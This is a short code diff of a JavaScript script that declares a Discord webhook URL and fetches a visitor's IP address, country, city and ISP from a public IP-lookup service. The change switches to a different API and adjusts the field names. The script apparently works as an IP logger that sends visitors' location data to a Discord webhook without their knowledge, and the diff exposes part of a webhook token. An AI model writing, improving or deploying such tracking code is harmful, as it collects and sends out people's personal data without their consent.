@@ -4,14 +4,14 @@ const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOX
 // Function to fetch the user's IP address, location data, and ISP
 async function fetchIPData() {
   try {
-    const response = await fetch("https://ipwhois.app/json/");
+    const response = await fetch("https://ipapi.co/json/"); // More reliable IP API
     const data = await response.json();
     return {
       ip: data.ip,
-      country: data.country,
+      country: data.country_name,
       countryCode: data.country_code,
       city: data.city,
-      isp: data.isp // Fetching ISP from the response
+      isp: data.org || "Unknown ISP" // Fetching ISP (organization) from the response
     };
   } catch (error) {
     console.error("Error fetching IP data:", error);
